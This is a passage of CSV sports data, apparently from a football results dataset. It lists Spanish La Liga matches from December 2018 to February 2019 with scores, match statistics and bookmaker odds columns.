.3,1.25,29,1.29,1.26,4,3.74,22,2,1.92,1.85,2.25,2.01,13.5,8.1,1.19\r\nSP1,16/12/2018,Sevilla,Girona,2,0,H,0,0,D,17,8,5,2,18,12,5,3,2,1,0,0,1.44,4.5,7,1.45,4.75,6.75,1.55,4,6.2,1.45,4.82,7.46,1.44,4.6,7,1.45,4.8,7,37,1.55,1.45,4.85,4.6,7.82,6.95,34,1.67,1.62,2.41,2.29,22,-1.5,2.5,2.28,1.7,1.65,1.42,4.81,8.33\r\nSP1,17/12/2018,Alaves,Ath Bilbao,0,0,D,0,0,D,11,6,2,3,16,13,5,3,2,2,0,0,3,3.2,2.5,2.75,3.3,2.6,2.85,3.1,2.6,2.95,3.23,2.66,2.9,3.1,2.6,2.88,3.2,2.55,35,3.01,2.88,3.3,3.15,2.81,2.59,33,2.4,2.29,1.65,1.61,19,0.25,1.75,1.71,2.25,2.2,3.23,3.22,2.47\r\nSP1,21/12/2018,Girona,Getafe,1,1,D,0,0,D,12,5,4,2,9,13,4,1,1,2,0,0,2.62,3,2.9,2.75,2.9,2.9,2.65,2.95,2.95,2.72,3.04,3.05,2.62,3,3,2.7,3.1,3,35,2.87,2.69,3.1,3.01,3.12,2.94,32,2.75,2.6,1.53,1.49,21,-0.25,2.35,2.25,1.73,1.69,2.69,3.03,3.1\r\nSP1,21/12/2018,Sociedad,Alaves,0,1,A,0,1,A,18,9,4,3,14,11,10,1,2,4,0,0,1.75,3.5,5,1.78,3.4,5.25,1.85,3.5,4.4,1.79,3.54,5.31,1.75,3.5,5.25,1.8,3.6,5,36,1.85,1.79,3.6,3.49,5.31,5.05,34,2.3,2.22,1.71,1.66,21,-1,2.6,2.53,1.6,1.55,1.72,3.61,5.81\r\nSP1,22/12/2018,Ath Bilbao,Valladolid,1,1,D,1,0,H,8,5,3,2,25,12,3,1,3,2,0,0,1.75,3.4,5,1.75,3.6,5,1.73,3.55,5.2,1.76,3.6,5.49,1.73,3.5,5.5,1.75,3.6,5.5,36,1.79,1.74,3.75,3.58,5.55,5.22,34,2.25,2.17,1.75,1.68,22,-1,2.49,2.39,1.65,1.61,1.7,3.72,5.81\r\nSP1,22/12/2018,Ath Madrid,Espanol,1,0,H,0,0,D,8,18,5,4,16,13,5,9,1,1,0,0,1.4,4,10,1.42,4.25,9,1.37,4.3,11,1.42,4.19,11.05,1.42,4,11,1.45,4.2,9.5,36,1.46,1.42,4.4,4.13,11.05,9.74,34,2.36,2.25,1.7,1.64,22,-1,1.8,1.75,2.2,2.14,1.44,4.32,9.53\r\nSP1,22/12/2018,Barcelona,Celta,2,0,H,2,0,H,9,11,5,1,14,15,4,6,0,1,0,0,1.12,9,21,1.11,9.75,21,1.12,9,20,1.13,10.28,18.95,1.1,11,19,1.11,11,26,36,1.17,1.12,11.25,9.83,26,19.17,32,1.2,1.17,5.25,4.74,22,-2.5,1.85,1.79,2.14,2.07,1.14,9.89,18.6\r\nSP1,22/12/2018,Betis,Eibar,1,1,D,1,0,H,4,15,2,4,11,13,4,11,2,4,0,0,1.8,3.75,4.5,1.78,3.7,4.6,1.75,3.7,4.8,1.81,3.84,4.68,1.78,3.75,4.5,1.85,3.75,4.5,36,1.85,1.8,3.9,3.73,4.8,4.5,34,1.85,1.78,2.11,2.04,22,-1,2.56,2.46,1.63,1.57,1.85,3.84,4.43\r\nSP1,23/12/2018,Leganes,Sevilla,1,1,D,1,0,H,13,8,4,2,14,9,3,6,3,3,0,1,3.4,3.2,2.25,3.25,3.25,2.3,3.3,3.25,2.3,3.42,3.25,2.35,3.3,3.2,2.3,3.2,3.3,2.3,36,3.44,3.28,3.35,3.23,2.37,2.3,33,2.2,2.1,1.8,1.73,19,0.25,1.94,1.89,2.03,1.98,3.05,3.15,2.64\r\nSP1,23/12/2018,Valencia,Huesca,2,1,H,1,0,H,19,11,8,4,14,15,12,5,7,4,0,0,1.4,4.75,8,1.4,4.4,9,1.42,4.55,7.9,1.4,4.69,9.64,1.38,4.6,9.5,1.4,4.8,8.5,36,1.45,1.4,4.85,4.59,9.8,8.51,33,1.8,1.73,2.2,2.09,21,-1.5,2.31,2.2,1.75,1.71,1.45,4.3,9.15\r\nSP1,23/12/2018,Vallecano,Levante,2,1,H,1,0,H,18,12,8,7,13,10,3,5,2,2,0,0,2.1,3.6,3.4,2.1,3.8,3.25,2.25,3.4,3.2,2.14,3.95,3.27,2.1,3.8,3.2,2.1,3.75,3.25,35,2.25,2.11,4,3.77,3.4,3.24,32,1.7,1.63,2.36,2.26,19,-0.25,1.9,1.86,2.07,2.02,2.17,3.83,3.3\r\nSP1,03/01/2019,Villarreal,Real Madrid,2,2,D,1,2,A,12,14,4,7,12,13,6,4,2,2,0,0,3.8,3.8,1.85,3.9,3.75,1.83,3.8,3.9,1.87,4.02,3.98,1.9,4,3.9,1.85,3.9,3.9,1.87,34,4.1,3.93,4,3.83,1.92,1.87,32,1.6,1.54,2.55,2.44,20,0.75,1.84,1.78,2.16,2.11,4.95,4.2,1.7\r\nSP1,04/01/2019,Espanol,Leganes,1,0,H,1,0,H,12,10,1,2,10,17,3,6,2,5,0,1,2,3.3,4.2,2,3.2,4.2,2,3.3,4,2.04,3.28,4.33,2,3.2,4.2,2,3.3,4.3,36,2.08,2.01,3.33,3.22,4.4,4.2,33,2.67,2.52,1.58,1.52,20,-0.25,1.76,1.72,2.26,2.2,1.99,3.17,4.78\r\nSP1,04/01/2019,Levante,Girona,2,2,D,0,1,A,19,9,8,2,18,16,8,2,3,1,1,0,2.15,3.5,3.3,2.15,3.5,3.3,2.15,3.55,3.25,2.24,3.6,3.32,2.2,3.5,3.25,2.15,3.6,3.3,36,2.28,2.18,3.65,3.55,3.47,3.3,34,1.76,1.71,2.23,2.14,19,-0.25,2,1.9,2.02,1.98,2.21,3.68,3.33\r\nSP1,05/01/2019,Alaves,Valencia,2,1,H,2,1,H,14,14,5,2,10,13,2,6,3,3,0,0,3.1,3.1,2.4,3.1,3.2,2.4,3.15,3.1,2.45,3.15,3.27,2.49,3.1,3.2,2.4,3.2,3.2,2.5,33,3.3,3.13,3.29,3.15,2.5,2.43,30,2.55,2.41,1.61,1.56,18,0.25,1.84,1.8,2.12,2.07,3.4,3.25,2.36\r\nSP1,05/01/2019,Huesca,Betis,2,1,H,0,0,D,11,7,6,1,21,7,4,6,3,2,0,0,3.2,3.5,2.2,3.3,3.4,2.2,3.2,3.4,2.25,3.28,3.46,2.32,3.2,3.4,2.25,3.25,3.5,2.3,33,3.4,3.24,3.5,3.4,2.34,2.25,30,1.95,1.88,2.05,1.92,17,0.25,1.96,1.92,1.99,1.94,3.27,3.55,2.29\r\nSP1,05/01/2019,Valladolid,Vallecano,0,1,A,0,1,A,12,9,5,5,16,23,9,5,0,3,0,0,2.1,3.4,3.6,2.05,3.4,3.7,2.1,3.35,3.65,2.14,3.38,3.8,2.1,3.3,3.7,2.15,3.4,3.7,33,2.16,2.09,3.47,3.35,3.85,3.71,31,2.12,2.04,1.85,1.77,18,-0.25,1.86,1.8,2.16,2.08,2.16,3.3,3.86\r\nSP1,06/01/2019,Eibar,Villarreal,0,0,D,0,0,D,24,7,6,4,12,17,13,1,0,2,0,0,2.1,3.25,3.5,2.1,3.5,3.5,2.15,3.5,3.4,2.18,3.54,3.52,2.15,3.4,3.4,2.15,3.5,3.5,33,2.2,2.14,3.6,3.46,3.6,3.44,30,1.95,1.87,2,1.93,17,-0.25,1.91,1.85,2.07,2.02,2.19,3.45,3.58\r\nSP1,06/01/2019,Getafe,Barcelona,1,2,A,1,2,A,10,12,2,8,23,12,4,4,4,3,0,0,8,5.25,1.36,7.5,5,1.4,7.2,5,1.4,7.4,5.18,1.42,8,5,1.38,8,5.2,1.36,33,8.5,7.62,5.3,5.01,1.45,1.4,31,1.6,1.54,2.6,2.43,19,1.5,1.82,1.78,2.17,2.1,7.27,4.96,1.44\r\nSP1,06/01/2019,Real Madrid,Sociedad,0,2,A,0,1,A,28,12,8,4,13,13,10,4,5,1,1,0,1.33,6,7.5,1.33,5.5,8.75,1.35,6,7,1.35,5.49,9.03,1.33,5.25,9,1.33,5.5,8.5,33,1.38,1.34,6,5.43,9.1,8.47,32,1.5,1.43,3,2.75,19,-1.5,2.02,1.94,2,1.91,1.36,5.14,9.51\r\nSP1,06/01/2019,Sevilla,Ath Madrid,1,1,D,1,1,D,15,12,5,7,15,11,4,5,5,7,0,0,2.8,3.1,2.7,2.8,3.2,2.65,2.7,3.1,2.8,2.84,3.15,2.81,2.75,3.1,2.75,2.8,3.2,2.8,33,2.86,2.78,3.2,3.11,2.85,2.73,31,2.35,2.26,1.68,1.63,17,-0.25,2.42,2.36,1.66,1.63,2.94,3.41,2.56\r\nSP1,07/01/2019,Celta,Ath Bilbao,1,2,A,1,1,D,17,8,3,4,16,21,3,2,2,5,0,0,2.4,3.3,3,2.4,3.3,3,2.45,3.25,2.95,2.52,3.33,3.05,2.5,3.25,2.9,2.45,3.3,3,33,2.55,2.44,3.38,3.27,3.17,2.99,30,2.06,1.99,1.87,1.81,17,-0.25,2.19,2.12,1.8,1.77,2.58,3.1,3.19\r\nSP1,11/01/2019,Vallecano,Celta,4,2,H,2,2,D,11,13,8,4,12,8,7,5,4,1,0,0,2.5,3.4,2.8,2.5,3.3,2.85,2.5,3.3,2.85,2.59,3.26,3.02,2.5,3.25,2.9,2.5,3.4,3,38,2.62,2.53,3.4,3.23,3.02,2.93,37,2.24,2.14,1.84,1.71,22,-0.25,2.24,2.16,1.78,1.74,2.52,3.28,3.09\r\nSP1,12/01/2019,Girona,Alaves,1,1,D,1,0,H,9,15,4,4,21,14,6,3,4,2,0,0,2.1,3.1,4,2.15,3.1,3.75,2.3,3.1,3.4,2.23,3.15,3.86,2.2,3,3.75,2.25,3.1,3.8,38,2.3,2.19,3.2,3.09,4,3.73,36,2.65,2.51,1.57,1.52,21,-0.25,1.9,1.86,2.05,2,1.96,3.48,4.36\r\nSP1,12/01/2019,Leganes,Huesca,1,0,H,0,0,D,14,9,7,3,11,9,4,4,3,3,0,0,1.95,3.25,4.33,1.95,3.25,4.4,2,3.3,4,2.01,3.26,4.48,1.95,3.2,4.4,2,3.3,4.4,38,2.05,1.98,3.34,3.23,4.55,4.32,36,2.57,2.44,1.6,1.55,22,-0.25,1.72,1.69,2.33,2.25,2.12,3.03,4.47\r\nSP1,12/01/2019,Valencia,Valladolid,1,1,D,0,0,D,17,6,5,1,15,18,7,0,2,5,0,0,1.53,4,7,1.55,3.9,6.75,1.65,3.9,5.2,1.59,3.86,7.01,1.55,3.8,7,1.6,4,6.5,38,1.65,1.57,4.1,3.89,7.1,6.63,36,2.09,2,1.9,1.82,24,-1,2.1,2.01,1.91,1.86,1.53,3.97,7.96\r\nSP1,12/01/2019,Villarreal,Getafe,1,2,A,0,0,D,17,9,6,4,14,13,6,1,5,3,0,0,2.15,3.1,3.8,2.15,3.1,3.8,2.2,3.2,3.5,2.16,3.21,3.99,2.15,3.1,3.8,2.2,3.2,3.8,38,2.2,2.15,3.25,3.14,4.05,3.8,37,2.35,2.26,1.72,1.64,21,-0.25,1.9,1.83,2.1,2.05,2.05,3.38,4.14\r\nSP1,13/01/2019,Ath Bilbao,Sevilla,2,0,H,1,0,H,10,10,3,4,14,14,7,6,4,3,0,0,2.75,3.2,2.7,2.75,3.25,2.65,2.85,3.2,2.55,2.72,3.34,2.8,2.7,3.2,2.7,2.75,3.3,2.75,38,2.85,2.71,3.37,3.25,2.8,2.69,37,2.11,2.03,1.88,1.79,21,0.25,1.7,1.66,2.38,2.29,2.7,3.21,2.92\r\nSP1,13/01/2019,Ath Madrid,Levante,1,0,H,0,0,D,19,7,5,2,9,17,5,2,0,3,0,0,1.25,6,12,1.28,5.75,11,1.3,5.5,9.6,1.26,5.93,13.8,1.25,5.8,13,1.29,6,11.5,38,1.3,1.27,6.1,5.75,14,11.97,37,1.7,1.64,2.4,2.26,23,-1.5,1.91,1.85,2.12,2.02,1.32,5.18,11.82\r\nSP1,13/01/2019,Barcelona,Eibar,3,0,H,1,0,H,7,15,6,2,10,12,2,3,2,1,0,0,1.12,9,21,1.12,9.5,18,1.15,8,17,1.14,9.51,19.09,1.12,9,19,1.12,9.5,21,38,1.16,1.13,10.75,9.07,23,18.4,36,1.26,1.24,3.85,3.61,23,-2.5,2.15,1.98,1.93,1.88,1.17,8.07,17.37\r\nSP1,13/01/2019,Betis,Real Madrid,1,2,A,0,1,A,9,14,2,5,9,13,6,5,2,3,0,0,3.25,3.75,2.1,3.25,3.75,2.1,3.45,3.5,2.1,3.29,3.94,2.13,3.25,3.75,2.1,3.2,3.8,2.1,36,3.45,3.26,4,3.74,2.18,2.11,34,1.67,1.62,2.4,2.28,21,0.25,2.05,2.01,1.89,1.85,3.06,3.77,2.31\r\nSP1,14/01/2019,Sociedad,Espanol,3,2,H,2,2,D,9,21,4,2,15,12,7,3,7,4,1,0,2,3.3,4,1.95,3.3,4.2,2,3.2,4.2,2,3.31,4.47,1.91,3.3,4.4,1.95,3.4,4.1,37,2.03,1.97,3.45,3.31,4.5,4.16,36,2.35,2.26,1.7,1.64,20,-0.25,1.71,1.68,2.31,2.25,2.2,3.29,3.75\r\nSP1,18/01/2019,Getafe,Alaves,4,0,H,1,0,H,12,6,5,0,17,18,4,2,0,4,0,0,2,3.1,4.5,1.95,3.1,4.75,1.9,3.3,4.5,2.09,3.01,4.63,2,3.1,4.4,2.05,3.2,4.3,34,2.1,2.01,3.3,3.07,4.9,4.54,32,3,2.74,1.49,1.44,16,-0.75,2.49,2.39,1.67,1.61,1.79,3.47,5.48\r\nSP1,19/01/2019,Celta,Valencia,1,2,A,1,0,H,12,13,4,8,18,12,4,6,4,3,0,0,3.1,3.2,2.4,3.1,3.1,2.45,2.7,3.2,2.7,3.15,3.34,2.45,3,3.2,2.45,3.13,3.25,2.45,37,3.2,3.04,3.34,3.22,2.7,2.45,36,2.25,2.14,1.78,1.71,21,0.25,1.84,1.8,2.13,2.09,3.37,3.41,2.29\r\nSP1,19/01/2019,Huesca,Ath Madrid,0,3,A,0,1,A,14,15,3,8,15,13,6,5,2,2,0,0,5.75,3.6,1.66,5.75,3.6,1.67,6.7,3.6,1.6,6.01,3.5,1.74,5.8,3.6,1.67,5.75,3.6,1.73,37,6.7,5.68,3.7,3.55,1.76,1.7,36,2.35,2.23,1.7,1.66,23,1,1.7,1.65,2.38,2.31,6.26,3.46,1.72\r\nSP1,19/01/2019,Real Madrid,Sevilla,2,0,H,0,0,D,23,4,6,1,9,14,7,4,2,3,0,0,1.7,4.2,4.5,1.72,4.1,4.5,1.7,4.2,4.5,1.77,4.12,4.55,1.7,4.2,4.5,1.75,4.2,4.5,37,1.8,1.74,4.25,4.1,4.65,4.42,35,1.56,1.53,2.6,2.48,21,-1,2.31,2.25,1.72,1.69,1.69,4.17,5.06\r\nSP1,20/01/2019,Barcelona,Leganes,3,1,H,1,0,H,15,5,7,2,12,18,5,1,3,3,0,0,1.12,9,21,1.13,9,19.5,1.12,8.5,22,1.14,8.97,24.26,1.11,9,23,1.12,9,23,37,1.15,1.13,11.25,8.86,27,21.43,35,1.4,1.36,3.25,3.07,23,-2.5,2.11,2.06,1.86,1.81,1.22,6.35,16.61\r\nSP1,20/01/2019,Betis,Girona,3,2,H,1,2,A,12,8,5,5,9,12,7,2,2,4,0,0,1.61,3.75,6,1.62,3.9,5.75,1.75,3.7,4.8,1.65,4.05,5.64,1.65,3.8,5.5,1.67,3.9,5.75,37,1.75,1.64,4.1,3.9,6,5.51,35,2.03,1.94,1.96,1.87,23,-1,2.25,2.16,1.8,1.73,1.65,3.97,5.92\r\nSP1,20/01/2019,Levante,Valladolid,2,0,H,1,0,H,13,13,4,3,12,18,3,2,6,5,0,0,2.1,3.5,3.5,2.05,3.5,3.6,2.1,3.4,3.5,2.12,3.64,3.59,2.05,3.5,3.6,2.1,3.6,3.4,37,2.14,2.08,3.75,3.55,3.65,3.5,35,1.85,1.78,2.1,2.04,21,-0.25,1.86,1.81,2.11,2.07,1.94,3.65,4.18\r\nSP1,20/01/2019,Vallecano,Sociedad,2,2,D,2,1,H,11,10,4,4,14,10,2,9,2,1,0,0,2.87,3.3,2.5,2.85,3.3,2.5,2.85,3.3,2.5,2.82,3.63,2.53,2.8,3.5,2.45,2.75,3.5,2.5,37,2.91,2.81,3.63,3.46,2.56,2.49,35,1.9,1.84,2.08,1.97,21,0.25,1.77,1.74,2.23,2.16,2.89,3.35,2.63\r\nSP1,20/01/2019,Villarreal,Ath Bilbao,1,1,D,0,1,A,3,9,1,2,17,13,1,3,4,1,0,0,2.2,3.3,3.4,2.15,3.3,3.5,2.2,3.3,3.4,2.3,3.32,3.45,2.2,3.3,3.4,2.25,3.4,3.2,37,2.32,2.24,3.45,3.31,3.5,3.36,36,2.16,2.07,1.82,1.76,21,-0.25,2.01,1.95,1.96,1.92,2.04,3.51,3.98\r\nSP1,21/01/2019,Eibar,Espanol,3,0,H,1,0,H,16,6,9,0,16,10,6,2,2,5,0,0,2.1,3.1,4,2.05,3.3,3.8,2.1,3.3,3.65,2.09,3.42,3.91,2.05,3.3,3.8,2.05,3.4,3.75,36,2.11,2.06,3.46,3.34,4,3.79,35,2.3,2.18,1.74,1.68,20,-0.25,1.83,1.78,2.19,2.11,1.85,3.66,4.68\r\nSP1,26/01/2019,Ath Madrid,Getafe,2,0,H,2,0,H,10,6,6,2,11,26,3,6,2,7,0,2,1.53,3.6,8,1.55,3.7,7.25,1.55,3.7,7.2,1.59,3.69,7.62,1.57,3.6,7.5,1.62,3.7,7,37,1.62,1.58,3.87,3.67,8,7.21,35,2.57,2.45,1.6,1.55,23,-1,2.16,2.09,1.85,1.79,1.71,3.25,7.24\r\nSP1,26/01/2019,Leganes,Eibar,2,2,D,0,2,A,9,5,3,2,15,14,4,5,2,3,0,0,2.62,3,3,2.6,3,3,2.7,2.9,2.9,2.77,3.04,2.99,2.62,3,3,2.75,3,3,37,2.8,2.68,3.12,2.98,3.05,2.96,35,2.9,2.7,1.5,1.45,21,-0.25,2.31,2.26,1.71,1.67,2.77,2.98,3.05\r\nSP1,26/01/2019,Sevilla,Levante,5,0,H,0,0,D,23,7,9,0,15,13,5,8,2,1,0,0,1.53,4.33,6,1.55,4.33,5.75,1.5,4.5,6.2,1.56,4.41,6.1,1.55,4.33,5.8,1.57,4.5,5.5,37,1.59,1.55,4.6,4.38,6.5,5.8,36,1.52,1.47,2.63,2.45,23,-1,1.96,1.9,2.01,1.96,1.4,5.1,8.17\r\nSP1,26/01/2019,Valencia,Villarreal,3,0,H,1,0,H,18,14,9,5,13,8,7,4,1,3,0,0,1.83,3.6,4.5,1.87,3.4,4.5,1.87,3.6,4.2,1.9,3.61,4.47,1.85,3.5,4.33,1.91,3.6,4.4,37,1.94,1.88,3.75,3.55,4.5,4.28,35,2,1.92,1.95,1.89,21,-1,2.77,2.69,1.55,1.49,2.08,3.4,3.97\r\nSP1,27/01/2019,Ath Bilbao,Betis,1,0,H,1,0,H,11,8,2,2,20,6,6,4,4,2,1,0,2.1,3.3,3.5,2.15,3.3,3.5,2.05,3.4,3.65,2.11,3.48,3.78,2.1,3.3,3.7,2.1,3.4,3.6,36,2.17,2.1,3.54,3.37,3.82,3.64,35,2.15,2.06,1.84,1.76,20,-0.25,1.85,1.8,2.12,2.08,2.1,3.3,4.05\r\nSP1,27/01/2019,Espanol,Real Madrid,2,4,A,1,3,A,13,16,6,9,15,17,1,6,3,4,0,1,4.2,4,1.8,4.1,4,1.8,4.4,3.7,1.8,4.33,4.03,1.82,4.2,3.9,1.8,4.2,3.9,1.8,35,4.5,4.21,4.05,3.86,1.85,1.8,33,1.76,1.7,2.24,2.16,20,1,1.62,1.58,2.51,2.45,5.59,4.02,1.66\r\nSP1,27/01/2019,Girona,Barcelona,0,2,A,0,1,A,13,15,5,7,18,12,3,8,5,3,1,0,10,5.25,1.33,9.5,5.25,1.33,8.8,5.3,1.33,8.95,5.59,1.35,8.5,5.5,1.33,9,5.5,1.33,36,10,8.79,5.65,5.34,1.37,1.34,34,1.55,1.48,2.76,2.58,22,1.5,1.95,1.92,2.01,1.95,10.12,5.66,1.32\r\nSP1,27/01/2019,Sociedad,Huesca,0,0,D,0,0,D,8,8,1,1,9,22,5,2,0,3,0,0,1.61,3.75,6,1.62,3.9,5.75,1.57,3.9,6.1,1.62,4.1,5.98,1.62,3.9,5.8,1.6,4,5.75,37,1.66,1.61,4.25,3.96,6.1,5.68,34,1.95,1.87,2,1.94,22,-1,2.16,2.08,1.85,1.79,1.63,3.92,6.31\r\nSP1,27/01/2019,Valladolid,Celta,2,1,H,0,1,A,19,8,7,3,15,19,7,5,2,5,0,1,2.4,3.2,3.1,2.4,3.25,3.1,2.4,3.15,3.1,2.5,3.26,3.14,2.4,3.2,3.1,2.45,3.3,3.13,37,2.52,2.42,3.3,3.2,3.21,3.1,35,2.38,2.28,1.67,1.62,20,-0.25,2.12,2.07,1.84,1.81,2.57,3.15,3.15\r\nSP1,28/01/2019,Alaves,Vallecano,0,1,A,0,0,D,16,14,1,3,14,19,7,4,2,5,0,0,2.15,3.3,3.5,2.15,3.25,3.6,2.05,3.3,3.8,2.24,3.38,3.54,2.2,3.25,3.5,2.2,3.3,3.4,36,2.29,2.2,3.38,3.27,3.8,3.47,35,2.2,2.13,1.77,1.71,20,-0.25,1.96,1.9,2.02,1.98,2.4,3.27,3.31\r\nSP1,01/02/2019,Huesca,Valladolid,4,0,H,1,0,H,11,9,7,4,17,11,7,7,6,2,0,0,2.25,3.25,3.4,2.25,3.2,3.4,2.3,3.05,3.45,2.31,3.29,3.47,2.25,3.1,3.5,2.25,3.25,3.6,35,2.35,2.28,3.3,3.16,3.6,3.45,33,2.65,2.52,1.57,1.52,19,-0.5,2.35,2.27,1.7,1.67,2.22,3.27,3.7\r\nSP1,02/02/2019,Barcelona,Valencia,2,2,D,1,2,A,20,14,8,7,8,5,9,1,3,0,0,0,1.28,5.75,11,1.3,5.75,9.25,1.3,5.8,9,1.3,6.41,9.03,1.25,6.5,10,1.29,6.25,10.5,35,1.32,1.29,6.5,6.05,11,9.31,32,1.4,1.36,3.35,3.09,22,-1.5,1.82,1.77,2.15,2.09,1.44,4.88,7.54\r\nSP1,02/02/2019,Celta,Sevilla,1,0,H,0,0,D,10,13,4,2,13,12,4,9,4,4,0,0,3.75,3.6,2,3.7,3.6,2,3.6,3.6,2,3.73,3.77,2.03,3.6,3.6,2,3.6,3.7,2.1,35,3.8,3.61,3.77,3.61,2.1,2.02,34,1.85,1.77,2.14,2.05,20,0.25,2.19,2.11,1.8,1.77,3.53,3.62,2.15\r\nSP1,02/02/2019,Levante,Getafe,0,0,D,0,0,D,8,9,4,2,7,15,5,5,4,3,0,0,2.37,3.25,3.1,2.4,3.25,3.1,2.4,3.3,3,2.47,3.37,3.09,2.4,3.3,3,2.4,3.4,3.1,35,2.48,2.39,3.42,3.33,3.2,3.05,33,2.05,1.98,1.91,1.83,20,-0.25,2.11,2.05,1.86,1.82,2.58,3.4,2.92\r\nSP1,02/02/2019,Sociedad,Ath Bilbao,2,1,H,2,0,H,6,8,2,5,17,13,3,3,1,1,0,0,2.35,3.3,3.2,2.25,3.25,3.4,2.4,3.15,3.15,2.41,3.24,3.32,2.3,3.2,3.25,2.38,3.3,3.25,35,2.42,2.35,3.3,3.18,3.4,3.25,34,2.4,2.3,1.67,1.62,20,-0.25,2.05,2.01,1.9,1.86,2.58,2.93,3.38\r\nSP1,03/02/2019,Betis,Ath Madrid,1,0,H,0,0,D,7,13,3,1,7,21,1,7,4,3,0,0,4,3.2,2.05,3.8,3.3,2.05,4,3.15,2.05,3.99,3.45,2.06,3.9,3.3,2,4,3.3,2,34,4.05,3.9,3.45,3.31,2.12,2.04,32,2.45,2.34,1.65,1.6,20,0.25,2.2,2.13,1.8,1.75,4.05,3.31,2.1\r\nSP1,03/02/2019,Eibar,Girona,3,0,H,1,0,H,17,6,5,2,12,9,8,5,2,1,0,0,1.66,4,5,1.72,3.7,5,1.8,3.6,4.5,1.74,3.95,4.99,1.67,4,5,1.7,3.8,5,35,1.8,1.71,4.05,3.86,5.25,4.9,33,2,1.93,1.95,1.87,22,-1,2.44,2.32,1.7,1.64,1.64,4.21,5.49\r\nSP1,03/02/2019,Real Madrid,Alaves,3,0,H,1,0,H,22,8,8,1,10,12,7,2,0,3,0,0,1.2,6.5,15,1.22,6.5,12.5,1.25,6.1,11,1.23,6.91,12.51,1.22,6.5,13,1.2,6.5,15,35,1.25,1.22,7.25,6.53,15.5,12.8,34,1.48,1.43,2.95,2.76,22,-2,2.18,2.06,1.86,1.8,1.2,7.61,14.04\r\nSP1,03/02/2019,Villarreal,Espanol,2,2,D,1,0,H,14,17,5,2,22,16,3,2,4,5,0,0,1.8,3.75,4.5,1.8,3.75,4.4,1.8,3.7,4.35,1.83,3.97,4.35,1.75,3.8,4.5,1.8,3.8,4.75,35,1.84,1.81,4,3.79,4.75,4.34,33,1.95,1.89,1.99,1.92,21,-1,2.69,2.53,1.6,1.54,2.15,3.6,3.55\r\nSP1,04/02/2019,Vallecano,Leganes,1,2,A,0,1,A,15,13,6,4,19,10,5,6,6,4,0,1,2.37,3.25,3.1,2.3,3.1,3.4,2.35,3.1,3.3,2.39,3.16,3.44,2.3,3.1,3.4,2.38,3.2,3.2,34,2.4,2.34,3.25,3.13,3.48,3.31,33,2.45,2.34,1.65,1.59,19,-0.25,2.05,2,1.9,1.86,2.75,3.11,2.94\r\nSP1,08/02/2019,Valladolid,Villarreal,0,0,D,0,0,D,9,7,3,3,13,18,8,3,3,2,0,0,2.9,3.3,2.4,3,3.25,2.45,3,3.3,2.4,3.09,3.29,2.52,3,3.2,2.55,3,3.3,2.55,34,3.1,2.99,3.35,3.24,2.58,2.48,33,2.16,2.09,1.81,1.75,19,0,2.18,2.13,1.8,1.76,3.23,3.45,2.35\r\nSP1,09/02/2019,Ath Madrid,Real Madrid,1,3,A,1,2,A,11,11,2,4,21,16,3,4,7,3,1,0,2.37,3.25,3.1,2.4,3.3,3,2.4,3.25,3.05,2.43,3.32,3.2,2.45,3.2,3.1,2.45,3.3,3.1,33,2.51,2.42,3.35,3.25,3.2,3.06,32,2.13,2.06,1.85,1.77,19,-0.25,2.12,2.07,1.85,1.81,2.66,3.21,2.97\r\nSP1,09/02/2019,Espanol,Vallecano,2,1,H,0,1,A,15,9,5,3,11,19,6,2,0,2,0,0,1.8,3.6,4.5,1.8,3.7,4.5,1.8,3.6,4.5,1.83,3.71,4.7,1.83,3.6,4.6,1.85,3.7,4.6,34,1.87,1.82,3.75,3.62,4.75,4.51,32,1.97,1.9,2,1.91,20,-1,2.62,2.53,1.6,1.54,1.7,3.89,5.42\r\nSP1,09/02/2019,Getafe,Celta,3,1,H,1,1,D,12,13,6,3,16,13,4,3,3,3,0,1,1.9,3.4,4.33,1.87,3.4,4.6,1.95,3.3,4.3,1.95,3.38,4.56,1.95,3.3,4.4,1.95,3.4,4.5,34,2,1.94,3.4,3.32,4.6,4.36,32,2.45,2.38,1.65,1.58,20,-0.75,2.33,2.25,1.72,1.69,2.03,3.31,4.34\r\nSP1,09/02/2019,Girona,Huesca,0,2,A,0,2,A,13,6,7,6,9,18,13,2,3,1,1,0,2,3.3,4,1.95,3.4,4.1,1.97,3.35,4.1,2,3.43,4.27,2,3.3,4.2,2,3.4,4.1,33,2.04,1.98,3.5,3.35,4.3,4.1,31,2.21,2.1,1.78,1.73,19,-0.25,1.73,1.7,2.28,2.22,1.92,3.48,4.58\r\nSP1,10/02/2019,Ath Bilbao,Barcelona,0,0,D,0,0,D,13,10,5,2,23,10,6,4,4,2,1,0,4.75,4,1.7,4.75,3.9,1.72,4.5,3.9,1.75,4.81,3.84,1.79,4.75,4,1.73,4.4,4,1.75,34,5.13,4.66,4.08,3.86,1.8,1.74,33,1.71,1.66,2.35,2.21,22,1,1.73,1.64,2.39,2.3,5.27,3.74,1.75\r\nSP1,10/02/2019,Leganes,Betis,3,0,H,2,0,H,16,3,4,1,22,11,4,4,4,2,0,1,2.25,3,3.6,2.35,3.1,3.3,2.3,3.05,3.4,2.38,3.18,3.45,2.35,3.1,3.4,2.3,3.2,3.5,33,2.43,2.34,3.2,3.1,3.6,3.36,31,2.63,2.48,1.42,1.38,20,-0.25,2.03,1.97,1.94,1.89,2.08,3.28,4.16\r\nSP1,10/02/2019,Sevilla,Eibar,2,2,D,0,1,A,13,8,4,4,11,7,9,7,4,2,1,0,1.66,4,5,1.67,4.1,4.75,1.67,4.05,4.85,1.68,4.16,5.13,1.7,4,5,1.65,4.1,5,33,1.73,1.68,4.2,4.02,5.13,4.92,32,1.75,1.71,2.25,2.14,21,-1,2.25,2.17,1.77,1.72,1.85,3.54,4.89\r\nSP1,10/02/2019,Valencia,Sociedad,0,0,D,0,0,D,10,8,4,1,11,18,7,5,2,4,0,0,1.83,3.5,4.5,1.83,3.5,4.5,1.8,3.6,4.55,1.82,3.74,4.74,1.83,3.6,4.6,1.8,3.7,4.8,33,1.89,1.82,3.75,3.58,4.8,4.54,32,2.11,2.02,1.87,1.8,20,-1,2.63,2.54,1.6,1.54,1.83,3.56,5.01\r\nSP1,11/02/2019,Alaves,Levante,2,0,H,1,0,H,16,8,4,0,14,18,3,10,3,2,0,0,2,3.4,3.8,2.05,3.4,3.8,2.05,3.45,3.6,2.1,3.54,3.75,2.05,3.5,3.7,2.05,3.5,3.6,34,2.12,2.06,3.6,3.47,3.85,3.65,32,2.05,1.97,1.9,1.84,20,-0.25,1.81,1.78,2.14,2.09,2.14,3.38,3.79\r\nSP1,15/02/2019,Eibar,Getafe,2,2,D,0,1,A,11,7,6,4,12,12,3,3,2,2,0,0,2.05,3.3,4,2.05,3.1,4.1,2.05,3.1